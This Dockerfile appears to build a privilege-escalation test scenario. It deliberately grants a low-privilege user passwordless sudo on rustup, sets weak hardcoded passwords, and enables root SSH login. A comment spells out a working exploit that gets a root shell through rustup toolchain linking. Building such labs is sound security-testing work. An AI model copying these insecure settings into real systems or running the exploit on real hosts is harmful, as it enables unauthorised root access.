FROM debian:bookworm-slim

# ============================================================
# PrivEscalate Scenario: sudo_rustup
# ATT&CK: T1548.003 | CWE: CWE-269
# Vulnerability: sudo misconfiguration allows running /usr/bin/rustup as root
# ============================================================

ENV DEBIAN_FRONTEND=noninteractive

# Install SSH server, sudo, and dependencies
RUN apt-get update && \
    apt-get install -y \
        openssh-server \
        sudo \
        curl \
        ca-certificates \
    && rm -rf /var/lib/apt/lists/* \
    && mkdir -p /run/sshd

# Install rustup system-wide
# We install as root to /usr/local so rustup binary ends up accessible
ENV RUSTUP_HOME=/usr/local/rustup
ENV CARGO_HOME=/usr/local/cargo
RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | \
    sh -s -- -y --default-toolchain stable --no-modify-path && \
    ln -sf /usr/local/cargo/bin/rustup /usr/bin/rustup && \
    ln -sf /usr/local/cargo/bin/rustc /usr/bin/rustc && \
    ln -sf /usr/local/cargo/bin/cargo /usr/bin/cargo

# Verify rustup is installed
RUN which rustup && rustup --version

# Create low-privilege user
RUN useradd -m -s /bin/bash lowpriv && \
    echo "lowpriv:password123" | chpasswd

# --- Configure sudo vulnerability ---
# rustup can link custom toolchains and run arbitrary binaries as "rustc".
# Exploit:
#   mkdir -p /tmp/pwn/bin /tmp/pwn/lib
#   cp /bin/sh /tmp/pwn/bin/rustc
#   sudo rustup toolchain link x /tmp/pwn
#   sudo rustup run x rustc
# This runs /bin/sh as root.
RUN echo "lowpriv ALL=(root) NOPASSWD: /usr/bin/rustup" > /etc/sudoers.d/rustup && \
    chmod 440 /etc/sudoers.d/rustup

# Verify sudo configuration
RUN visudo -c

# Keep SUID on sudo
RUN chmod u+s /usr/bin/sudo

# Configure SSH
RUN sed -i 's/#PermitRootLogin.*/PermitRootLogin yes/' /etc/ssh/sshd_config && \
    sed -i 's/#PasswordAuthentication.*/PasswordAuthentication yes/' /etc/ssh/sshd_config && \
    echo "root:aim8Du7h" | chpasswd

EXPOSE 22
CMD ["/usr/sbin/sshd", "-D"]